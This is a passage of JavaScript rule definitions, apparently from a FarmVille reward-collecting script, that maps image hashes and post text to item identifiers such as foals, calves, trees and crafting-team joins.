					{img:"30fd8ad645f0641a5352aa65c8974ee9",ret:"tree_giantgem"},
					{img:"4686c180d0bfcd5a9811f6e00d61a562",ret:"tree_bonsairainbowbutterfly"},
					{img:"52a011bb200079418a508678bf954803",ret:"tree_giantparasolii"},
					{img:"0558bead5ff6659411d47c8cc74361be",ret:"tree_giantparasol"},
					{img:"4673dcf1e7bf433be7149340e3ff117c",ret:"tree_sapphirepixie"},
					{img:"9eb0b2f7e365ddac6a9c7df1e3fdd841",ret:"tree_giantwitchhatii"},
					{img:"cea508d772d218778bebcb5cc335b43c",ret:"tree_giantwitchhat"},
					{img:"a01eb4aeba3a645d7df54f6d98e10714",ret:"tree_giantscaryhaunted"},
					{img:"6ad113935990c49d7c4845513c49bd57",ret:"tree_gianthaunted"},
					{img:"a9e6c12bce81cf05c2360215060123e4",ret:"tree_giantwolffullmoon"},
					{img:"170671be865a3a0f5f53445a81d1bc29",ret:"tree_giantfullmoon"},
					{img:"4ffa3631dfb504f01c5413f1f6be5b53",ret:"tree_giantghost"},
					{img:"09ff0203bd4cee8a7d8fe7e0e405e7ab",ret:"tree_giantghostdecoration"},
					{img:"9f5094140636fbc3af0635f40a214850",ret:"tree_giantcornucopiaii"},
					{img:"e6514e9633ad82c128ede4bff7209258",ret:"tree_giantcornucopia"},
				]},
				
				//search icon & stork images to distinguish animals with same body texts
				{link:"adopt",ret:"none",kids:[
				//http://zynga1-a.akamaihd.net/farmville/assets/hashed/
				//{img:["",""],ret:"adopt_"},
					{img:["15e38b30179a04917ff3bab15901b3be","0e2c3c77854ea229b4b571d9e02532e8"],ret:"adopt_calfdragonbull"},
					{img:["a3069e38a97de8d1b84bb053b7156ff3","f47b12167e061b28ee915ca3b7815040"],ret:"adopt_calfdragon"},
					{img:["8f2e3a7c0d14621e01bdfd6bc6c35477","b0435de353e751307db7040b47610c56"],ret:"adopt_foalsteamunicorn"},
					{img:["3d83a5e5791aa3a56126f1acf4123799","a2fc3e466ba8ace4bac48bae0544ed98"],ret:"adopt_foalsteam"},
					{img:"69a9745107f3aaca304d8dc2ab7e97fe",ret:"adopt_foalwaterpegacorn"},
					{img:["d5b29e3eaca146793f85fb7c9c1a83ee","52bd7e1d599384324d88bc61f9c91e35"],ret:"adopt_foalwater"},
					{img:["0df95c3121881eef77a6ef72ab9b12f0","28869ee77ed804c626bee8d5ad36fa23"],ret:"adopt_calfballoon2"},
					{img:["94c1c6072e0449e0002df45089a5680b","e7cc6cc5d5d6bed749394a7c459b134f"],ret:"adopt_calfballoon"},
					{img:["696aee3053c286a166044171f1ca0851","cefe112c1d857bd03c661460ccf7b6be"],ret:"adopt_calfnewyear2"},
					{img:["d827308bf768abf82ecca05cea922a35","12a44e1531e58624d2f3cc868281beed"],ret:"adopt_foalpinatapony"},
					{img:["17ade87a37528d0bb78a9df7f02de2b1","0ba372abc9c3e54c34f451d2c2d7fde5"],ret:"adopt_foalpinata"},
					{img:["a6aa68a317bc02b4983891c7b147e84b","10ff4042630f82410b4e7189ae4f8d21"],ret:"adopt_foalcheerfullscroogi"},
					{img:["d8bf04f415763b9219f8662e9bc87807","d51cebfa246e166e9fde96027de54717"],ret:"adopt_foalorlovtrotter2"},
					{img:["0be9d257d59774cb54eed7abcb383483","c09097904ab62f3ba1c8ae3d4d7bfc39"],ret:"adopt_foalorlovtrotter"},
					{img:["47d95aeb6e7802e4f5b8581dec832b02","8523f9c36c5648a622bf3d6f35a63373"],ret:"adopt_foalnutcrackerpegacorn"},
					{img:["0a6f0d74e144c672e77c29244acb5bdc","ed32a274894869de2303208628500860"],ret:"adopt_foalnutcracker"},
					{img:["6be6f1d4bda076040a48d2cb9007e2ee","f3f2e0853dae91c9b53a4f323f010304"],ret:"adopt_calfinsweater"},
					{img:["29aec17c19666e487d31501ae34190c6","eb6dc2ad5e6cb118fbd882de4c389995"],ret:"adopt_calfinhoodie"},
					{img:"77850262c7056b8f3792cae77716223d",ret:"adopt_calftreat"},
					{img:["bfac37d6f74f7c99749601754794527e","e5bb8c4cb6b64dd84027309977dc8bb6"],ret:"adopt_foalspectralpegasus"},
					{img:["ee910c3a0f08870c342002f8f4b6b110","7365034c23b759afb98fed19611acfd1"],ret:"adopt_foalspectral"},
					{img:["6ccf995298e4220a18256569a4a80cf3","1d733b6b2fb5df3c11de3410c48288dc"],ret:"adopt_foalvampiredonkey"},
					{img:["ea3d7e72d71415e98334887281990975","81af946796c59ee5cb7c67de2864aebc"],ret:"adopt_foalsunflower"},
					{img:["8f9cf0f826541af183d8f59a30012330","657627d4f0160a39d5bd0959c2e53d87"],ret:"adopt_foaldoleyellow"},
					{img:["063f52aba61132730477047744c4c943","36d07749a7582a6310132417816b8a69"],ret:"adopt_foalfairy"},
					{img:["66ab06e2df4cfe9de4ba60de581f71a8","6b71661bf0867e5f061823357b47c782"],ret:"adopt_foalfairydonkey"},
					{img:["2a9238c253062bcee86dab7e1c911161","7e45caef2699d79effa6fd2389393643"],ret:"adopt_foalbutterfly"},
					{img:["79a43fee89ceac21c9a008cd123499ea","bd4a686ccc21af6eea1d882805e2bd8a"],ret:"adopt_foalbutterflypegacorn"},
					{img:["7f4aaa8e9e9e4b01ae1f59b0cb767007","09ab00b0063cb11def16b5c32abbdc2b"],ret:"adopt_foalmoonpegasus"},
					{img:["33162f3ee9b0011dbe69308aaf4d5d1a","0e597e22492b1e076b0c2f3b48b63b63"],ret:"adopt_foalsunpegasus"},
					{img:["127c6e61858a37de8e2ab4a3832ebcc8","dd86618ece1bf5557220439a2b622591"],ret:"adopt_foalsun"},
					{img:["fbfca9db6773876ef57ddfd466ff66a6","8828d0f991d4d8cacfa3a2e26d4f7030"],ret:"adopt_calfdracalfla"},
					{img:["58602ac3eeca799e8567f77244681576","949c85344e3e9b7fa0129266daa26e26"],ret:"adopt_calfcornucalfpia"},
					{img:["a8f2f8d3804da17d64bbf6dc31422350","d431a9854e28dd1ceef6b23598983889"],ret:"adopt_foalharvestunicorn"},
					{img:["cdb04021f7e0e6e0bf0eb30c0e1ca9e4","d9eafec7506bcbec9f5c96aa760a2cab"],ret:"adopt_foalharvestpony"},
					{img:["d7bb6b64fc1213dcd878dcb3a95750d6","c6cbea42e5b38798c7440f3b00778c42"],ret:"adopt_foalharvest"},
					{img:["411a43b84bd40d977d8bea671d00b0d3","d4af71ac7d9b0a0bbb04509731f97a5d"],ret:"adopt_foalthanks"},
					{img:["299431eb6cbca041989ea28c082e0a69","b80ad39bc2b850c35ad03bf612576c51"],ret:"adopt_calffoal"},
					{img:["52dfb5b55c576a52e941633b63d47136","4adead082d97cafaf6efa334d1be151d"],ret:"adopt_foalfranken"},
					{img:["825e1a986e07f18da5eb43c55787f2e0","4d67bb5061a42c1abd912e5df7b716b5"],ret:"adopt_foalblacksteed"},
					{img:"9ee5049ff3099dda4e804b50040b6be7",ret:"adopt_foalblack"},
					{img:["4904ae11f0716fdddd790a388aac8a42","1be73edba1b06a04a9be489ec1a31291"],ret:"adopt_foalsapphireunicorn"},
					{img:["3557da7e314c350bfc910c5e3814f1c0","66a212abb18125402fd82a8071c813af"],ret:"adopt_foalsapphire"},
					{img:["422a3ef58b40432f6faf2445f1ba7d82","b4667059e622c0ad3dce6e306619acab"],ret:"adopt_foalamethystunicorn"},
					{img:["9f4db4cad33bc58ae73d7dcacd103e80","79a243b24ca67ff27a4ec5fdac1c7635"],ret:"adopt_foalamethyst"},
					{img:["1d3980e4a5780f6cfe63ee4e187290c2","484c39d894fd448e0cc5da19883d2eab"],ret:"adopt_foalmoonsteed"},
					{img:["03d8e5a6250c82aa763b5e0fd17d8bee","8574a8a55004d39b044b3dff36e83a42"],ret:"adopt_foalmoon"},
					{img:["4101550aa6e8542d168d7dcbf5bb1d15","e2935e5d35f7f01a810fb004bb89b3aa"],ret:"adopt_foalcherrypegacorn"},
					{img:["c72dbdd7c1afd0cfcd8437c0599ba09d","c25a050880fa0a90c3234a4b1edfb96c"],ret:"adopt_foalfriendshippegasus"},
					{img:["1ad6ebfe43e67016bfd9bf8ee488bf5d","0303a994fbb2ed7c9a0a9c17729e5d89"],ret:"adopt_foalfriendship"},
					{img:"824290b5bdcd1e702bbdb19e7f3b1a33",ret:"adopt_foalballoonpony"},
					{img:["eec01f8a608e6fde02a908e5f031ffcd","319a871bd4cee80caa1000ba7844293f"],ret:"adopt_foalballoon"},
					{img:["a3296aaf1c2f6ab5235f41038646aa0b","52531c423fa31d46978c5a5404966efa"],ret:"adopt_foalcandycorn"},
					{img:["6c4f8f10802946b4d1c51755548809d9","c0601163daac553e141923dcdc48e0b6"],ret:"adopt_foalcandycornpony"},
					{img:"6f82eb77932eff007e6a955467355681",ret:"adopt_foalnightmaremini"},
					{img:["3809a8b10346e4b290ecfec94ad8da8e","ee48ca0cabfd337abddb077dddd9209d"],ret:"adopt_foalnightmare"},
					{img:["1d9268fc937dda3b4bcd5ab1954ba01b","cb46a3934da7a5f9fd7e6c6c9faa320b"],ret:"adopt_calfholidaybull"},
					{img:["a7a3d17cfd8add6e4cb5bd6198f694b3","a6fd6ad586ac5fb37bd5aba83524f279"],ret:"adopt_calfholidaywreath"},
					{img:["ee174fe3388734c7a21cecee560cd30d","d8d444ea83aa160162e4fa59acc19835"],ret:"adopt_calfholiday"},
					{img:["8829e58a2c7e39fc8e5012d0c8c2f679","7ea063c8cac4c65354366f00ddf58d50"],ret:"adopt_foalwhitepegasus"},
					{img:["fd885b15f91752e200c0ebf0b58d6c5d","7e01d7f3c6e6940d4b98cc74321be3e3"],ret:"adopt_foalgypsystallion"},
					{link:"Items:foal_gypsy_st",ret:"adopt_foalgypsystallion"},
					{img:["57408b56ed20ae7f71e15f1036489160","c4daef35af7f7256226a7c7680dd9692"],ret:"adopt_foaldiscopony"},
					{img:["9155daa26714cf89f5abeaf706bb6d4c","869cff415e74ac29dfd61c61d7f351a3"],ret:"adopt_foaldisco"},
					{img:["727a79da46ba46d34e6d120d70eeb062","e43bf2f2e70ac9289290020d2e40fbeb"],ret:"adopt_calfnewyear"},
					{img:["5dad5998d9f543dbb4675ef0ac44076c","4f478aa8e1a7c489795a25c5bcec0fac"],ret:"adopt_calfliondance"},
					{img:["a30736e7038302d01883890e0aa45d8e","e54ac8b6e104e93ebd6c318bbb26c7de"],ret:"adopt_foalvalentinepony"},
					{img:["0aabfc003d4d13fcdac155aa09f32544","0955750886dcf3a43f231b593393b622"],ret:"adopt_foalvalentine"},
					{img:["8a84039faad7fbc1a1fac5c79cd0e0c4","37aa58ee438aab5b3a0af6f994c4664d"],ret:"adopt_foalromance"},
					{img:["50926cd51434156b8f4d1b1f9cfde619","8cf02fbcc6c1d9045c5c8951392700c0"],ret:"adopt_foalromancemini"},
					{img:["2cfba1572a2036e92ab170e782935918","7f88a0996956641994848c0b79e04926"],ret:"adopt_calfbullflower"},
					{img:"d98f08f1e8bb5bb788ffd72e76422fbb",ret:"adopt_foalfireflypegacorn"},
					{img:"1c4a03ceaa3cc411f7c4d71b3f1d4d18",ret:"adopt_foalfireflypony"},
					{img:"1cc446cc8415ee741c1b382a842fabc7",ret:"adopt_foalfirefly"},
					{img:"b24865d67e5eb688fdf7f104cb745c59",ret:"adopt_calfcalfstructionworker"},
					{img:["60d3a70aeb3353530de9d0fd3eea65d7","4f4c0b033cd2fdd271a4454340fe65d0"],ret:"adopt_foalgoldenmini"},
					{img:["4a10ac5cfef4bbb50ecfb9d9faed8e43","ea1b2a0f4d074d28a6aed83bcb6928a2"],ret:"adopt_foalgoldenstallionmini"},
					{img:["9a3c74da8488a0bd61ee43849b4a1d95","89263f674488821212132ebc401b9993"],ret:"adopt_foalstarunicorn"},
					{img:["d926a74a59c981d1c307399a3fa3e4e8","5acc468f763190bbfdfc993c908625ac"],ret:"adopt_foalstar"},
					{img:["55af1affde7028ba9f3f4be1161a3fd9","e46fd82d6490a35b456b605a23bccc32"],ret:"adopt_foalcamarguestallion"},
					{img:["e999952b2652f3dc53799119f58506b5","a69891e58e60af069acc6f8864b42748"],ret:"adopt_foalcamargue"},
					{img:["62e722cfe219da98e065cbb1e3390956","5862781a30a49fdae2c2b50ffe66d09b"],ret:"adopt_foalglittering"},
					{img:["2fdbbd27bc3c3d6ff5dea411e67ee601","fc8699e7c62ef4043990b29ed507613d"],ret:"adopt_foalglitter"},
				]},
				
				//dino dna
				{search:["title","caption"],find:"{%1} DNA Strand",subTests:dnaTypes,ret:"dna_{%1}"},
				//gems
				{search:["title","caption"],find:"{%1}",subTests:gemTypes,ret:"gem_{%1}"},
				//dragon scales
				{search:["title","caption"],find:"{%1} dragon scale",subTests:scaleTypes,ret:"scale_{%1}"},
				//monster serum
				{search:["title","caption"],find:"{%1} monster serum",subTests:serumTypes,ret:"serum_{%1}"},
				//bonsai cutting
				{search:["title","caption"],find:"{%1} bonsai cutting",subTests:cuttingTypes,ret:"cutting_{%1}"},
				//animal spirit
				{search:["title","caption"],find:"{%1} animal spirit",subTests:spiritTypes,ret:"spirit_{%1}"},
				//fossils
				{search:["title","caption"],find:"{%1} fossil",subTests:fossilTypes,ret:"fossil_{%1}"},
				//pixie dust
				{search:["title","caption"],find:"{%1} pixie dust",subTests:pixieTypes,ret:"pixie_{%1}"},
				
				
				//search calves/foals by link text before materials
				{link:"{%1} baby",subTests:allFoals,ret:"adopt_foal{%1}"},
				{link:"{%1} stud",subTests:allFoals,ret:"adopt_foal{%1}"},
				{link:"{%1} colt",subTests:allFoals,ret:"adopt_foal{%1}"},
				{link:"{%1} foal",subTests:allFoals,ret:"adopt_foal{%1}"},
				{link:"{%1}foal",subTests:allFoals,ret:"adopt_foal{%1}"},
				{link:"{%1}calf",subTests:allCalves,ret:"adopt_calf{%1}"},
				{search:["title","caption"],find:"{%1}-foal",subTests:allFoals,ret:"adopt_foal{%1}"},
				{link:"{%1}calf",subTests:allCalves,ret:"adopt_calf{%1}"},
				{link:"{%1} calf",subTests:allCalves,ret:"adopt_calf{%1}"},
				{link:"adopt the calf",ret:"none",kids:[
					{search:["title","caption"],find:"found a {%1} calf",subTests:allCalves,ret:"adopt_calf{%1}"},
					{search:["title","caption"],find:"Baby Ox",ret:"adopt_calfbabyox"},
				]},
				
				//send
				{link:["give","send","lend"],ret:"none",kids:[
					{link:"and get",ret:"none",kids:[
						{search:["link","title","caption"],find:"animal feed",ret:"animalfeed"},
						{search:["title","caption"],find:"needs another {%1}",subTests:materials,ret:"{%1}"}, //sogo
					]},
					{link:"item to",ret:"sendwishlist"}, //send wishlists
					{link:"{%1}",subTests:["feed","bushel","help","bottle"],ret:"send{%1}"}, //specific sends
					{link:"{%1}",subTests:craftingMaterials,ret:"sendbasket"},
					{link:["materials","building parts","parts"],ret:"sendmat"},
					{search:["title","caption"],find:"{%1}",subTests:buildings,ret:"sendmat"},
					{search:["title","caption"],find:"{%1}",subTests:[].concat(materials,otherWords),ret:"sendmat"},
				]},
				
				//building materials by building
				{link:["materials","part"],ret:"none",kids:[
					{link:"{%1}",subTests:materials,ret:"{%1}"}, //<---- added this to avoid marking vehicle parts as goo
					{search:["title","caption"],find:"{%1}",subTests:materials,ret:"{%1}"},
					{search:["title","caption"],find:"{%1}", ret:"none",
						subTests:["upgrading","good progress","addition of a station","half-way","halfway","finished","expanding","completion of","upgrade of","progress on","built a","adding stations","adding a station",
								  "is making progress on their","wants you to claim their spare parts","has so much stuff that they couldn't carry this","working hard to improve","get extra materials"],
						kids:[{search:["title","caption"],find:"{%1}",ret:"mat_{%1}",subTests:buildings}]
					},
					{search:["title","caption"],find:"{%1}",subTests:buildings,ret:"mat_{%1}"},
					{img:"50ae3ca24932a8f905a81a78ea17a6a2",ret:"mat_beehive"},
				]},
				
				//catchall for bushels. here we use body text because link text is sometimes wrong or truncated.
				{search:["title","caption"],find:"bushel", ret:"bushel", kids:[
					{search:["title","caption"],find:"giving away free {%1} bushels",subTests:bushelTypes,ret:"bushel_{%1}"},
					{search:["title","caption"],find:"{%1} bushel",subTests:bushelTypes,ret:"bushel_{%1}"},
					{search:["title","caption"],find:"{%1}",subTests:bushelTypes,ret:"bushel_{%1}"},
				]},
				
				//hatch specific eggs
				{search:["title","caption"],find:"found some treasured {%1} mystery eggs",subTests:eggTypes,ret:"egg_{%1}"},
				{search:["title","caption"],find:"basket full of {%1} eggs",subTests:eggTypes2,ret:"egg_{%1}"},
				{link:["hatch","grab an egg"],ret:"none",kids:[
					{search:["title","caption"],find:"{%1}",subTests:eggTypes2,ret:"egg_{%1}"},
					{search:["title","caption"],find:"{%1}",subTests:eggTypes,ret:"egg_{%1}"},
				]},
				
				//trees
				{search:["title","caption"],find:"{%1}",subTests:["tree","seedling grew up "],ret:"none",kids:[
					{search:["title","caption"],find:"ornament tree II",ret:"tree_ornament2"},
					{search:["title","caption"],find:"{%1}",subTests:["giant","gaint","big","large"],ret:"none",kids:[
						{search:["title","caption"],find:"{%1}",subTests:treeTypes2,ret:"tree_giant{%1}"},
					]},
					{search:["title","caption"],find:"bonsai {%1} ii",subTests:treeTypes3,ret:"tree_bonsai{%1}"},
					{search:["title","caption"],find:"{%1} bonsai ii",subTests:treeTypes3,ret:"tree_bonsai{%1}"},
					{search:["title","caption"],find:"magic {%1} bonasi",subTests:treeTypes3,ret:"tree_bonsai{%1}"},
					{search:["title","caption"],find:"magic {%1}",subTests:treeTypes3,ret:"tree_bonsai{%1}"},
					{search:["title","caption"],find:"{%1}",subTests:treeTypes,ret:"tree_{%1}"},
				]},
				
				//crafted samples
				{search:["title","caption"],find:"{%1}", subTests:["improved their","offering some free sample","now a master","bought some"], ret:"none",kids:[
					//this entry may seem redundant but it actually prevents misidentification mistakes
					{search:["title","caption"],find:"{%1}", subTests:craftTypes, ret:"sample",kids:[
						{search:["title","caption"],find:"level {%1} ", subNumRange:"1,20", ret:"sample1"},
						{search:["title","caption"],find:"level {%1} ", subNumRange:"21,40", ret:"sample2"},
						{search:["title","caption"],find:"level {%1} ", subNumRange:"41,80", ret:"sample3"},
						{search:["title","caption"],find:"level {%1} ", subNumRange:"81,100", ret:"sample4"},
						{search:["title","caption"],find:"level {%1} ", subNumRange:"100,140", ret:"sample5"},						
					]},
					{link:"grab a good",ret:"sample2"},
				]},
				{link:"sample",ret:"sample"}, // prevents "goods" being mistaken for "goo" after other samples have been identified
				
				//simply by link texts
				//here we create an array on the fly for special words, then we add other predefined arrays, then we fix the order before searching
				{link:"{%1}", subTests:[].concat(decorTypes,materials,otherWords).fixOrder(), ret:"{%1}"},
				
				//order specific crops
				{link:"place order", ret:"order",kids:[
					{search:["title","caption"],find:"{%1}", subTests:bushelTypes, ret:"order_{%1}"},
				]},			
				
				//mystery babies
				{link:["adopt a mystery baby","adopt an egg","adopt a winter baby","adopt a cute baby","adopt a jade baby"],ret:"unknown_baby",kids:[
					//img search
					{img:"ef81171be39fcdcc9f6bb8825fb2e450",ret:"petrun_common"},
					{img:"f87608154a4061f044e4ab92f55f3cfd",ret:"petrun_rare"},
					{img:"f4619e66d335c667128c8dfa92f069ee",ret:"wildlife_common"},
					{img:"0b27e2c1185116002e0475d50dde98b7",ret:"wildlife_rare"},
					{img:"116fd9ef14a14c94aea71f959f99db93",ret:"livestock_common"},
					{img:"1cfd92964ae41c740dfab9b7023271f1",ret:"livestock_rare"},
					{img:"182233e7ca189ea69462039a0b303706",ret:"zoo_common"},
					{img:"6d5347c8dae181c5afb15b03390b69e6",ret:"zoo_rare"},
					{img:"3c1015497c7d352157196c823f6cad63",ret:"aviary_common"},
					{img:"a94a8ddc8286fbc92d51a666ab23da55",ret:"aviary_rare"},
					{img:"183e4a3ba7be02fca7f550989b3a80e1",ret:"arctic_common"},
					{img:"7bf258c9ffdb411fa992b58e9994afc7",ret:"arctic_rare"},
					{img:"57ca62ee6fb4b67333c3bbb4a07f839b",ret:"sea_common"},
					{img:"241413129ffa5dc7e97af3edf0460781",ret:"sea_rare"},
					{img:"c8b7382788c77ff3b61434c4336a44c9",ret:"jade_common"},
					{img:"88bbb027d137cfeb4f8f91f475a15bda",ret:"jade_rare"},
					{img:"db7cf610f60857e9ba3bbec9a11de4ae",ret:"ocean_common"},
					{img:"8aa0550a5911cade1b597d4d7292d4bf",ret:"ocean_rare"},
					
					//body search
					{search:["title","caption"],find:"rare",ret:"none",kids:[
						{search:["title","caption"],find:"{%1}",subTests:["arctic","aviary","livestock","sea","pet run","petrun","wildlife","zoo"],ret:"{%1}_rare"},

					]}, //end rare
					{search:["title","caption"],find:"{%1}",subTests:["arctic","aviary","livestock","sea","pet run","petrun","wildlife","zoo"],ret:"{%1}_common"},
				]}, //end adopt

				
				//new cow pasture/horse paddock catches
				{link:["adopt a baby","adopt the baby"],ret:"none",kids:[
					{search:["title","caption"],find:["found an adorable ","found a "],ret:"none",kids:[
						{search:["title","caption"],find:"foal",ret:"adopt_foal",kids:[
							{search:["title","caption"],find:"{%1} foal",subTests:allFoals,ret:"adopt_foal{%1}"},
							{search:["title","caption"],find:"{%1}-foal",subTests:allFoals,ret:"adopt_foal{%1}"},
							{search:["title","caption"],find:"{%1}foal",subTests:allFoals,ret:"adopt_foal{%1}"},
						]},
						{search:["title","caption"],find:"calf",ret:"adopt_calf",kids:[
							{search:["title","caption"],find:"{%1} calf",subTests:allCalves,ret:"adopt_calf{%1}"},
							{search:["title","caption"],find:"{%1}calf",subTests:allCalves,ret:"adopt_calf{%1}"},
						]},
						{search:["title","caption"],find:"{%1} yak",subTests:yakTypes,ret:"adopt_yak{%1}"},
						{search:["title","caption"],find:"{%1}",subTests:babyAnimals,ret:"adopt_{%1}"},
					]},
					{search:["title","caption"],find:"Baby Mule",ret:"adopt_foalmule"},
					{search:["title","caption"],find:"Mistletoe Donkey Baby",ret:"adopt_foalmistletoedonkey"},
					{search:["title","caption"],find:"Trick Or Treat Donkey Baby",ret:"adopt_foaltrickortreatdonkey"},
					{search:["title","caption"],find:"found an adorable Grass Pony and",ret:"adopt_foalgrasspony"},
					{search:["title","caption"],find:"Pink Aloha Stallion Stud",ret:"adopt_foalpinkalohastallion"},
					{search:["title","caption"],find:"Orchid Stallion Stud",ret:"adopt_foalorchidstallion"},
					{search:["title","caption"],find:"Camargue Colt",ret:"adopt_foalcamarguestallion"},
					{search:["title","caption"],find:"Pink Fairy Stallion Colt",ret:"adopt_foalpinkfairystallion"},
					{search:["title","caption"],find:["Welsh Black Calf","Welsh Calf"],ret:"adopt_calfwelshblack"},
					{search:["title","caption"],find:"Foal Pegasus Aviator",ret:"adopt_foalaviatorpegasus"},
					{search:["title","caption"],find:"Frankenfoal",ret:"adopt_foalfranken"},
					{search:["title","caption"],find:"Baby Ox",ret:"adopt_calfbabyox"},
					{search:["title","caption"],find:"Calf Foal",ret:"adopt_calffoal"},
					{search:["title","caption"],find:"CornuCalfpia",ret:"adopt_calfcornucalfpia"},
					{search:["title","caption"],find:"Dracalfla",ret:"adopt_calfdracalfla"},
				]},
					
				//catchall for materials by link
				{link:"{%1}",subTests:materials,ret:"{%1}"},
				
				//join crafting teams
				{link:"join team",ret:"join",kids:[
					{img:"690d86ce9c4143329ab5f872584e1169",ret:"joinicehorsesculpture"},
					{img:"3699f5d32d503228bb5e0cd3afa75544",ret:"joinicepigsculpture"},
					{img:"c5e70c211e82a0bcc1abda64949630fa",ret:"joinmagicsnowflake"},
					{img:"fe063f1f8f1845c626dc868856dad075",ret:"joinbrightyellowtractor"},
					{img:"26b4f3ae87b43f8734d4988bd2805d19",ret:"joinmechanicscarecrow"},
					{img:"a10220ef5dc0a674dbc3ca263793328d",ret:"joinsheeptopiary"},
					{img:"69811776a063c0855c1733f68a33dcb3",ret:"joinappleredseeder"},
					{img:"6c01a99ead4203d971116324aca0e554",ret:"joinbonsai"},
					{img:"e51a6ceffb36d2bec6216200aa95e2b7",ret:"jointreehouse"},
					{img:"7839ea1528ff204e277e1fb47309abf3",ret:"joinappleredharvester"},
					{img:"a860f784f9347030c3d199a191b26a78",ret:"joinpostoffice"},
					{img:"b0f78411f7b6084cb32a9436e24a5658",ret:"joinevergreentrain"},
					{img:"4b8cc80501cc6d433b47b19bf3512337",ret:"joinfarmhand"},
					{img:"c38928055fddef53032e92de43d33342",ret:"joinyellowracertractor"},
					{img:"0a7f6ed48f63a0b6e277e5421c4624ef",ret:"joinstonewall"},
					{img:"83162ebbc9e06677ef8121ef01906efe",ret:"joinfertilizeall"},
					{img:"068f8f2e0112c398403588b7f264b6da",ret:"joindaintyfence"},
					{img:"b29c1f15b645f0d4e382a68a6fd3ff84",ret:"joinshovel"},
					{img:"18bb508499a8369017208586170d3cf0",ret:"joinwateringcan"},
					{img:"ee5dacb99882370f7b8662d862b4dda9",ret:"joinironfence"},
					{img:"890e543735401b5e5325d214805aa029",ret:"joinarborist"},
					{img:"d0ae91c4d9b02323ef3ae1133644e42c",ret:"joinlamppost"},					
					{img:"b42c0a157197ceb896afe22ec4c0e48f",ret:"joinanimalfeed"},
					{img:"78dff32c0ab8d3223d59278aba31166e",ret:"joinvehiclepart"},
					{img:"338ab39ec2b0e49cc93a406802d109ba",ret:"joinswisscabin"},
					{img:"738a3d1a5152e428317a25b39361e8d2",ret:"joinstonearchway"},
					{img:"0da8d0cfb50ed7f3e311cf5e6aa73d81",ret:"joinmilkingstool"},
					{img:"1f9040fc0b4f751852b851a4fdb644e0",ret:"joinscythe"},
					{img:"c065c449db07f585caee3e5facdd5c54",ret:"joinhorsesculpture"},
					{img:"53efef0cd100001a37cc1399a7f02cc5",ret:"joinbrick"},
					{img:"4d64954699fe7f1f8a19a4827dee2134",ret:"joinnail"},
					{img:"0efae744cf2befb26bc630b39cedaf81",ret:"joinwoodenboard"},
					{img:"6817c5c650fd418149601cbc1c83e3e9",ret:"joinluckypenny"},
					{img:"1a40c5d2f4f929a226b934e79c8f0602",ret:"joinfuel"},
					{img:"72016f512ae1b34e43eb21816a8692ab",ret:"joinbottle"},
					{img:"a8888075274db08167ebd4fafc4a7f91",ret:"joinlovepotion"},
					{img:"689dfc368b7d4061e2646699970b1123",ret:"joinpinefencei"},
					{img:"88a9d64c3a5f39e86dfc12575e76a950",ret:"joinpinefenceii"},
					{img:"dd1f0f1981e691f51f0d45ac6b2d8f1c",ret:"joinmoderntable"},
					{img:"6b19071a41140dc4944942be43d6def9",ret:"joinpuppykibble"},
					{img:"3bb35cd13ddc95f5c077dee905cc5190",ret:"joindogtreat"},
					{img:"b6dd31c53721c77db007b8a312b9f06b",ret:"joinmoati"},
					{img:"152ccad7da5edd2257af934c82996c77",ret:"joinmoatii"},
					{img:"5340407ec4d9395f55814d4da2260050",ret:"joinmoatiii"},
					{img:"a793a74c34ea640b1c818aa67a42f9ec",ret:"joinmoativ"},
					{img:"89ac1a38bcdc7ffbb18602b2e9bc1a00",ret:"joinmoatcorneri"},
					{img:"88a738c8310aef87329e3a75103117df",ret:"joinmoatcornerii"},
					{img:"3271cdc09b6cade975b9e96b3f977361",ret:"joinmoatcorneriii"},
					{img:"656278391986c724bb150b45f806701f",ret:"joinmoatcorneriv"},
					{img:"77d09f9046c790237bcfdf264cd80efc",ret:"joincastlebridge"},
					{img:"0ef896833905a2abcb1bb2939bb2bd37",ret:"joinenglandpostcard"},					
					{img:"a8d9fe654cb1a593046646c322ed8e5e",ret:"joinbeachball"},
				]},
				{url:["CraftingRandomLootFriendReward","CraftingRandomLootCrewFriendReward"],ret:"join",kids:[
					{search:["title","caption"],find:"{%1}",subTests:craftShop,ret:"join{%1}"},
				]},
				
				//collectibles and collection tradeins
				{search:["title","caption","desc"],find:"{%1}", subTests:["noticed you could use a","has completed the","collect"], ret:"none",kids:[
					{search:["title","caption","desc"],find:"{%1}", subTests:colTypes, ret:"col_{%1}"},
					{search:["title","caption","desc"],find:"{%1}", subTests:colGroups, ret:"colX_{%1}"},
				]},

				//perfect bunches
				{search:["title","caption"],find:"perfect bunch", ret:"perfectbunch", kids:[
					{search:["title","caption"],find:"{%1}", subTests:flowerTypes, ret:"perfect_{%1}"},
				]},

				//seeds
				{search:["title","caption"],find:"seed",ret:"none",kids:[
					{link:"honeybee", ret:"honeybee"},
					{search:["title","caption"],find:"pollinated", ret:"pollinated",kids:[
						{search:["title","caption"],find:"{%1}", subTests:bushelTypes, ret:"polseeds_{%1}"},
					]},
					{search:["title","caption"],find:"{%1}", subTests:seedTypes, ret:"seeds_{%1}"},
				]},

				//dynamic adoptions when foal/calf/duckling is in the link
				{link:"foal", ret:"adopt_foal",kids:[
					{search:["link","title","caption"],find:" {%1}", subTests:allFoals, ret:"adopt_foal{%1}"},
				]},
				{link:"calf", ret:"adopt_calf",kids:[
					{search:["link","title","caption"],find:" {%1}", subTests:allCalves, ret:"adopt_calf{%1}"},
				]},
				{link:"duckling", ret:"adopt_duckling",kids:[
					{search:["title","caption"],find:"duckling grew up to become a", ret:"adopt_duckling"},
					{search:["link","title","caption"],find:" {%1}", subTests:ducklingTypes, ret:"adopt_duckling{%1}"},
				]},
				
				//catchalls for missed foal/calf/ducklings by link
				{search:["title","caption"],find:"{%1} foal", subTests:allFoals, ret:"adopt_foal{%1}"},
				{search:["title","caption"],find:"{%1} calf", subTests:allCalves, ret:"adopt_calf{%1}"},
				{search:["title","caption"],find:"{%1} duckling", subTests:ducklingTypes, ret:"adopt_duckling{%1}"},

				//catchalls for other known animals sets
				{search:["title","caption"],find:"{%1} duck", subTests:duckTypes, ret:"adopt_duck{%1}"},
				{search:["title","caption"],find:"{%1} pig", subTests:pigTypes, ret:"adopt_pig{%1}"},
				{search:["title","caption"],find:"{%1} sheep", subTests:sheepTypes, ret:"adopt_sheep{%1}"},
				{search:["title","caption"],find:"{%1} ewe", subTests:sheepTypes, ret:"adopt_ewe{%1}"},
				{search:["title","caption"],find:"{%1} cow", subTests:cowTypes, ret:"adopt_cow{%1}"},
